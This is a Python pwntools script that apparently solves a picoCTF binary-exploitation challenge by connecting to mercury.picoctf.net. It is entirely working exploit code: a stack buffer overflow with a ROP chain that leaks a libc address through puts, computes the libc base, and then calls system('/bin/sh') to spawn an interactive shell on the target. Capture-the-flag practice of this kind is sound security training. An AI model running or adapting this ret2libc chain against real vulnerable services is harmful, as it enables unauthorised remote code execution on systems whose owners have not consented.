#!/usr/bin/env python3

from pwn import *

elf = ELF("./vuln_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = elf


io = remote('mercury.picoctf.net',49464)

offset = 136
pop_rdi = 0x0000000000400913
ret = 0x000000000040052e
main = 0x00400771


junk = b"A"*offset
print("setbuf ",hex(elf.got["setbuf"]))
#00601018
payload = flat([
    junk,
    p64(pop_rdi),
    p64(elf.got["setbuf"]),
    p64(elf.plt['puts']),
    p64(main)
    ])

io.recvuntil('!')
io.recvline()
io.sendline(payload)
io.recvline()
# io.recvline()
# print("check this out ",io.recvline())
leak =u64(io.recvline().strip().ljust(8,b"\x00"))
log.info(f"{hex(leak)=}")

libc.address = leak - 0x0000000000088540
log.info(f"base libc {hex(libc.address)=}")
BIN_SH=next(libc.search(b'/bin/sh\x00'))
print("bin sh ",hex(BIN_SH))
system_adr = libc.symbols["system"]

print("heres system",hex(system_adr))

payload2 = flat([
    junk,
    p64(pop_rdi),
    p64(BIN_SH),
    p64(ret),
    p64(system_adr),
    ])

print("checking ",io.recvuntil('!'))
print(io.recvline())

io.sendline(payload2)

io.interactive()
